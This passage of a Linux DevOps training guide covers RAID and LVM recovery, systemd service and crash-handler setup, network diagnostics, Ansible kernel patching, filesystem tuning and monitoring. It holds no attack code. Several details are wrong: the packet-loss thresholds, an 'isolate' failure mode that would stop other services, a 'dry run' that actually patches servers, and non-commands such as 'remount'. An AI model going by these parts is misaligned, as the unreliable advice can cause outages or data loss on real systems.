# Tune I/O scheduler (for HDDs)
cat /sys/block/sda/queue/scheduler
# "noop [deadline] cfq" = cfq is selected

# For SSD, use noop or none
echo "noop" > /sys/block/sda/queue/scheduler

# For HDD, use deadline
echo "deadline" > /sys/block/sda/queue/scheduler

# Make persistent
cat > /etc/udev/rules.d/99-io-scheduler.rules << 'EOF'
ACTION=="add|change", KERNEL=="sd[a-z]", ATTR{queue/scheduler}="deadline"
ACTION=="add|change", KERNEL=="nvme*", ATTR{queue/scheduler}="none"
EOF

udevadm control --reload-rules && udevadm trigger
```

---

## 📋 SCENARIO 5: SYSTEM RECOVERY FROM CATASTROPHIC FAILURE

**Disaster**: Primary database server crashed. RAID array degraded. Need to rebuild.

---

### Challenge 5.1: RAID Array Recovery

```bash
# INVESTIGATION
cat /proc/mdstat
# Output shows: md0: [U_]  raid1 (one disk down - underscore = missing)

# Check disk status
mdadm --detail /dev/md0
# Shows which disk failed

# Replace failed disk
# 1. Physically replace failed disk (if hot-swappable)
# 2. Partition it like the other disk
sudo fdisk /dev/sdb  # New disk
# Recreate same partition table as /dev/sda
sudo sfdisk -d /dev/sda | sudo sfdisk /dev/sdb

# 3. Add new disk to RAID array
sudo mdadm --manage /dev/md0 --add /dev/sdb1
# Monitor rebuild
watch -n 5 cat /proc/mdstat

# REBUILD TIME: Can take 2-6 hours depending on disk size
# Monitor progress
cat /proc/mdstat | grep -E "recovery|check"
# Output: "recovery = 45.3% (234567/512000)"

# Verify rebuild completed
cat /proc/mdstat
# Should show: md0: [UU]  raid1 (all disks healthy)
```

---

### Challenge 5.2: LVM Recovery

```bash
# If you're using LVM (Logical Volume Manager)

# Check PV (Physical Volumes)
pvs
# Should show: /dev/sda1, /dev/sdb1

# Check VG (Volume Groups)
vgs
# Should show: vg0 with both PVs healthy

# If PV is missing
pvdisplay
# Shows which PV is missing

# Remove missing PV from VG
sudo vgreduce --removemissing vg0

# To recover if original PV comes back online
pvresize /dev/sda1
vgextend vg0 /dev/sda1
```

---

## 📋 SCENARIO 6: SYSTEMD SERVICE MANAGEMENT & TROUBLESHOOTING

**Challenge**: Payment app crashes repeatedly. Need to debug systemd unit file.

---

### Challenge 6.1: Systemd Service Debugging

```bash
# CREATE proper systemd service unit
cat > /etc/systemd/system/payment-app.service << 'EOF'
[Unit]
Description=Payment Processing Application
Documentation=https://wiki.company.com/payment-app
After=network.target mysql.service
Wants=payment-app-monitor.service

[Service]
Type=simple
User=payment
Group=payment
WorkingDirectory=/opt/payment-app
Environment="JAVA_OPTS=-Xmx8g -Xms8g"
Environment="LOG_LEVEL=INFO"

# Start command
ExecStart=/opt/payment-app/bin/payment-app.sh

# Pre-start checks
ExecStartPre=/usr/bin/test -f /opt/payment-app/bin/payment-app.sh
ExecStartPre=/usr/bin/test -d /opt/payment-app/logs

# Graceful shutdown
ExecStop=/bin/kill -TERM $MAINPID
TimeoutStopSec=30
KillMode=process

# Auto-restart on failure
Restart=always
RestartSec=10
StartLimitBurst=5
StartLimitIntervalSec=300

# Process limits
MemoryMax=8G
CPUQuota=400%
TasksMax=2000
LimitNOFILE=65536
LimitNPROC=2000

# Logging
StandardOutput=journal
StandardError=journal
SyslogIdentifier=payment-app

# Security
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
ReadWritePaths=/opt/payment-app/logs /opt/payment-app/data

[Install]
WantedBy=multi-user.target
EOF

# RELOAD and test
sudo systemctl daemon-reload
sudo systemctl enable payment-app.service
sudo systemctl start payment-app.service

# CHECK status
sudo systemctl status payment-app.service
# Output shows: Active (running)

# MONITOR logs in real-time
journalctl -u payment-app.service -f

# If service is failing, check why
sudo systemctl status payment-app.service
# Shows: "failed (Result: exit-code)"

# Get detailed failure info
journalctl -u payment-app.service --no-pager -n 50

# DEBUG with verbose logging
journalctl -u payment-app.service -o verbose --no-pager
```

---

### Challenge 6.2: Service Restart Loops

**Problem**: Payment app crashes, systemd restarts it. Crashes again. Infinite loop.

```bash
# FIX 1: Identify why it's crashing
journalctl -u payment-app.service -n 200 | grep -i "error\|exception\|fail"

# FIX 2: Check resource limits hit
# If error is "Cannot allocate memory", increase MemoryMax

# FIX 3: Implement restart limit to prevent restart-loop
# In service file, set:
StartLimitBurst=3
StartLimitIntervalSec=60
# = If service restarts 3+ times in 60 seconds, stop trying

# FIX 4: Add pre-start health check
ExecStartPre=/usr/local/bin/payment-app-preflight-check.sh

# Script contents:
cat > /usr/local/bin/payment-app-preflight-check.sh << 'SCRIPT'
#!/bin/bash
# Check database connectivity
mysql -u payment -p${DB_PASS} -h ${DB_HOST} -e "SELECT 1;" || exit 1

# Check disk space
[ $(df / | awk 'NR==2 {print $4}') -gt 1000000 ] || exit 1

# Check required config file
[ -f /opt/payment-app/config/app.conf ] || exit 1
SCRIPT

chmod +x /usr/local/bin/payment-app-preflight-check.sh

# FIX 5: Implement OnFailure action (run cleanup on crash)
OnFailure=payment-app-crashed.service
OnFailureJobMode=isolate

# Create cleanup service
cat > /etc/systemd/system/payment-app-crashed.service << 'EOF'
[Unit]
Description=Payment App Crash Handler

[Service]
Type=oneshot
ExecStart=/usr/local/bin/payment-app-crash-handler.sh
EOF

# Crash handler script
cat > /usr/local/bin/payment-app-crash-handler.sh << 'EOF'
#!/bin/bash
# Log crash event
echo "$(date): Payment app crashed" >> /var/log/payment-app-crashes.log

# Send alert
curl -X POST http://monitoring.internal/api/alerts \
     -d "service=payment-app&status=crashed&time=$(date -u +%FT%T)"

# Preserve logs for analysis
cp /var/log/payment-app/app.log /var/log/payment-app/crash-logs/app.$(date +%s).log

# Optional: trigger automatic failover
/usr/local/bin/failover-to-secondary.sh

# Optional: notify on-call engineer
echo "Payment app crashed on $(hostname)" | mail -s "ALERT: Payment App Crash" oncall@company.com
EOF

chmod +x /usr/local/bin/payment-app-crash-handler.sh

# Test the service
sudo systemctl daemon-reload
sudo systemctl start payment-app.service

# Monitor in detail
watch -n 2 'sudo systemctl status payment-app.service'
```

---

## 📋 SCENARIO 7: NETWORK TROUBLESHOOTING & TCP/IP DEEP DIVE

**Alert**: Some customers reporting slow payment processing. Network issue suspected.

---

### Challenge 7.1: Network Diagnostics

```bash
# STEP 1: Verify IP configuration
ip addr show
# Check: Is IP assigned? Is it correct subnet?

ip route show
# Check: Default gateway reachable? Correct routes?

# STEP 2: Check interface status
ethtool eth0
# Shows: Speed, Duplex, Link detected: yes/no

# If Link detected: no → cable unplugged!

# STEP 3: Test basic connectivity
ping -c 4 8.8.8.8  # External DNS
ping -c 4 payment-db.internal  # Internal DB

# STEP 4: Check DNS resolution
nslookup payment-api.company.com
dig @8.8.8.8 payment-api.company.com +short
# Verify IP address is correct

# STEP 5: Check open connections
netstat -an | grep ESTABLISHED | wc -l
# High number: many connections active

# STEP 6: Find connection backlog
netstat -an | grep SYN_RECV | wc -l
# SYN_RECV connections stuck → server overwhelmed

# STEP 7: Trace route to destination
traceroute -m 15 payment-api.company.com
# Check: Where is latency occurring?

mtr -c 100 payment-api.company.com
# Continuous MTR (better than traceroute)

# STEP 8: Analyze packet loss
ping -i 0.01 -c 1000 payment-db.internal | grep -oP '\d+(?=% packet loss)'
# Output: 5% = normal, 10%+ = problem

# STEP 9: Test throughput
iperf -c <target-ip> -t 10
# Verify bandwidth is as expected

# STEP 10: Analyze network layer issues
tcpdump -i eth0 -n 'tcp port 3306' -c 100 -w db-traffic.pcap
# Capture and analyze packets offline in Wireshark

# Or real-time
tcpdump -i eth0 -n -A 'tcp port 3306' | head -100
```

---

### Challenge 7.2: TCP Connection Issues

```bash
# PROBLEM: Customers report occasional "Connection refused"

# INVESTIGATION 1: Check listening ports
ss -tlnp | grep 8080
# Shows: LISTEN socket on 8080

# INVESTIGATION 2: Check connection queue
ss -s | grep TCP
# TCP: inuse=1250, orphan=5, tw=450, alloc=2500
# If tw (TIME_WAIT) is very high → might exhaust port range

# INVESTIGATION 3: Check listen backlog
ss -tlnp | grep 8080
# State: LISTEN  Recv-Q=0  Send-Q=128
# Recv-Q: completed connections waiting for accept()
# Send-Q: backlog size (default 128)
# If Recv-Q consistently > 0 → server not accepting fast enough

# INVESTIGATION 4: Monitor connection states
watch -n 2 'ss -an | grep tcp | awk "{print \$1}" | sort | uniq -c | sort -rn'
# Shows distribution of TCP states

# THE FIX: Increase backlog
# In application code (if Java):
new ServerSocket(port, 512)  // Increase backlog from default 50 to 512

# In systemd unit:
ListenStream=8080:512

# In sysctl (kernel global setting):
sudo sysctl -w net.core.somaxconn=2048
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096

# Make persistent
cat >> /etc/sysctl.conf << 'EOF'
net.core.somaxconn = 2048
net.ipv4.tcp_max_syn_backlog = 4096
EOF
sudo sysctl -p
```

---

## 📋 SCENARIO 8: LINUX PATCHING & KERNEL UPDATES

**Requirement**: Apply critical security patches to 200 servers with zero downtime.

---

### Challenge 8.1: Linux Kernel & Security Patching Strategy

```bash
# STEP 1: Check current kernel version
uname -r
# Output: 5.10.0-14-generic-x64 #14-Ubuntu SMP

# STEP 2: Check for available updates
apt update
apt list --upgradable

# STEP 3: Check for critical security updates
apt list --upgradable | grep -i security

# STEP 4: Assess what's going to be updated
apt-cache policy linux-image-generic
apt-cache policy openssh-server openssl

# STEP 5: Create maintenance window plan
# Best practice: Apply on Tuesday 2 AM, stagger across data centers
#   DC1: 2:00 AM - 3:00 AM
#   DC2: 3:00 AM - 4:00 AM
#   DC3: 4:00 AM - 5:00 AM

# STEP 6: Test updates in staging first
# Provision staging server identical to production
apt update
apt install -y linux-image-generic
# Reboot staging: sudo reboot
# Verify application still works
ssh prod-staging-01
systemctl status payment-app

# STEP 7: Create automated patching script
cat > /usr/local/bin/safe-kernel-update.sh << 'EOF'
#!/bin/bash
set -e

LOG_FILE="/var/log/kernel-update-$(date +%Y%m%d-%H%M%S).log"

# Pre-update checks
echo "$(date): Starting kernel update" | tee $LOG_FILE

# 1. Backup current kernel parameters
grub-mkconfig -o /boot/grub/grub.cfg >> $LOG_FILE 2>&1

# 2. Apply updates
apt update >> $LOG_FILE 2>&1
DEBIAN_FRONTEND=noninteractive apt install -y linux-image-generic >> $LOG_FILE 2>&1

# 3. Verify kernel installed
NEW_KERNEL=$(ls -t /boot/vmlinuz-* | head -1 | xargs basename | sed 's/vmlinuz-//')
echo "$(date): New kernel: $NEW_KERNEL" | tee -a $LOG_FILE

# 4. Test reboot (if enabled)
if [ "$DRY_RUN" != "true" ]; then
  echo "$(date): Scheduling reboot for 2 minutes" | tee -a $LOG_FILE
  /sbin/shutdown -r +2 "System rebooting for kernel update" >> $LOG_FILE 2>&1
fi

echo "$(date): Kernel update completed" | tee -a $LOG_FILE
EOF

chmod +x /usr/local/bin/safe-kernel-update.sh

# STEP 8: Deploy across fleet using Ansible
cat > /etc/ansible/playbooks/kernel-update.yml << 'EOF'
---
- name: Update Linux Kernel Across Fleet
  hosts: payment-pool
  serial: "50%"  # Update 50% at a time (5 of 10 servers)
  pre_tasks:
    - name: Drain connections (remove from load balancer)
      shell: /opt/lb-agent/deregister-from-lb.sh
      ignore_errors: yes
    
    - name: Wait for connection draining
      pause:
        seconds: 30

    - name: Check if application is healthy
      shell: curl -s http://localhost:8080/health | jq .status
      register: health_check
      failed_when: health_check.stdout != '"UP"'

  tasks:
    - name: Run kernel update
      shell: /usr/local/bin/safe-kernel-update.sh
      environment:
        DRY_RUN: "false"

    - name: Wait for system to reboot
      pause:
        seconds: 120

    - name: Verify system is back online
      wait_for:
        host: "{{ inventory_hostname }}"
        port: 22
        delay: 10
        timeout: 300

  post_tasks:
    - name: Verify application health
      shell: curl -s http://localhost:8080/health
      register: app_health
      until: app_health.rc == 0
      retries: 10
      delay: 10

    - name: Re-register with load balancer
      shell: /opt/lb-agent/register-with-lb.sh

  handlers:
    - name: Reboot system
      reboot:
        msg: "Rebooting for kernel update"
        reboot_timeout: 300
EOF

# STEP 9: Execute patching (dry-run first)
ansible-playbook /etc/ansible/playbooks/kernel-update.yml --limit payment-pool -e "dry_run=true"

# Then real run:
ansible-playbook /etc/ansible/playbooks/kernel-update.yml --limit payment-pool -e "dry_run=false"

# STEP 10: Verify all servers updated
ansible -i /etc/ansible/hosts all -m shell -a "uname -r" | grep -E "payment-pool-|kernel"
```

---

## 📋 SCENARIO 9: FILESYSTEM & DISK MANAGEMENT

**Challenge**: Partition scheme needs redesign for better performance and reliability.

---

### Challenge 9.1: EXT4 vs XFS Filesystem Optimization

```bash
# CURRENT filesystem info
df -h
mount | grep -E "ext4|xfs"
tune2fs -l /dev/xvda1  # For ext4

# Check filesystem health
fsck -n /dev/xvda1  # Check (don't repair)
# Output: 0 errors = healthy

# Optimize ext4 for performance
# Disable journaling (risky, only for non-critical partitions)
tune2fs -O ^has_journal /dev/xvda1

# Or keep journal, optimize it
tune2fs -o user_xattr,acl /dev/xvda1

# For XFS (newer, better performance)
# Reformat if needed:
sudo mkfs.xfs -f /dev/xvda1
mount /dev/xvda1 /data

# Mount with optimal options
# /etc/fstab:
/dev/xvda1  /data  xfs  defaults,noatime,nodiratime,nobarrier,logbufs=8,logbsize=32k  0  0
# - noatime: don't update access time (saves writes)
# - nodiratime: don't update directory access time
# - nobarrier: don't use write barriers (risky, but faster)
# - logbufs: XFS log buffer configuration

remount /data
```

---

## 📋 SCENARIO 10: COMPREHENSIVE MONITORING & LOGGING

**Goal**: Implement production-grade monitoring and centralized logging.

---

### Challenge 10.1: Centralized Logging with ELK Stack

```bash
# STEP 1: Install Filebeat (log shipper)
sudo apt-get install -y filebeat

# STEP 2: Configure Filebeat
cat > /etc/filebeat/filebeat.yml << 'EOF'
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/payment-app/*.log
    - /var/log/syslog
    - /var/log/auth.log
  
  fields:
    hostname: "{{ .hostname }}"
    environment: "production"
    service: "payment-app"

# Process multiline logs (Java stack traces)
multiline.pattern: '^\['
multiline.negate: true
multiline.match: after

output.elasticsearch:
  hosts: ["elasticsearch-1.internal:9200", "elasticsearch-2.internal:9200"]
  index: "logs-%{[agent.version]}-%{+yyyy.MM.dd}"

processors:
  - add_host_metadata: ~
  - add_cloud_metadata: ~
EOF

# STEP 3: Start Filebeat
sudo systemctl restart filebeat
sudo systemctl enable filebeat

# STEP 4: Verify logs are being shipped
curl -s http://elasticsearch-1.internal:9200/_cat/indices?v | grep logs
```

---

### Challenge 10.2: System Monitoring with Prometheus & Node Exporter

```bash
# STEP 1: Install Node Exporter
sudo useradd -r -s /bin/false prometheus_node_exporter
sudo apt-get install -y prometheus-node-exporter

# STEP 2: Start Node Exporter
sudo systemctl enable prometheus-node-exporter
sudo systemctl start prometheus-node-exporter

# STEP 3: Verify metrics are exposed
curl -s http://localhost:9100/metrics | head -20

# STEP 4: Configure Prometheus to scrape
# On Prometheus server:
cat >> /etc/prometheus/prometheus.yml << 'EOF'
  - job_name: 'node-payment-prod'
    static_configs:
      - targets: ['payment-prod-01:9100', 'payment-prod-02:9100', ... 'payment-prod-08:9100']
EOF

sudo systemctl reload prometheus

# STEP 5: Create Grafana dashboard alerts
# Alert when:
#   - CPU > 80%
#   - Memory > 85%
#   - Disk > 90%
#   - Load > cores
#   - Swap > 0%
```

---

## 🎯 SUMMARY OF CRITICAL LINUX TOPICS COVERED

1. **Memory Management**: OOM crisis, SWAP tuning, cgroup limits
2. **Disk I/O**: Filesystem optimization, RAID recovery, space management
3. **CPU Performance**: Load analysis, thread tuning, interrupt handling
4. **Security**: SSH hardening, PAM, 2FA, intrusion detection
5. **Network**: TCP/IP troubleshooting, connection limits, bandwidth analysis
6. **Systemd**: Service management, restart policies, logging
7. **Patching**: Kernel updates, zero-downtime deployment
8. **Monitoring**: Centralized logging, metrics collection, alerting
9. **Storage**: RAID, LVM, filesystem types, disk lifecycle
10. **Compliance & Disaster Recovery**: Forensics, backups, restoration

---

## 🚀 BONUS: Quick Reference Commands

```bash
# Memory
free -h; cat /proc/meminfo; vmstat 1 5; top -b -n 1

# Disk
df -h; du -sh /*; iostat -x 1 5; iotop

# CPU
uptime; load average; lscpu; mpstat -P ALL 1 5; top

# Process
ps aux --sort=-%cpu; ps -eLf; pstree -p

# Network
netstat -an; ss -tulnp; ethtool eth0; iperf

# Systemd
systemctl status; journalctl -f; systemctl list-units

# Security
sudo -l; sudo su -; lastb; last; /var/log/auth.log

# Filesystem
fsck -n; tune2fs; mount; /etc/fstab

# Kernel
dmesg; uname -r; sysctl -a; /proc/sys
```

---

**End of Production Scenario Document**

This comprehensive guide covers critical production scenarios a 4-year DevOps engineer will face daily on Linux infrastructure. Each scenario includes investigation techniques, root cause analysis, practical fixes, and prevention strategies.
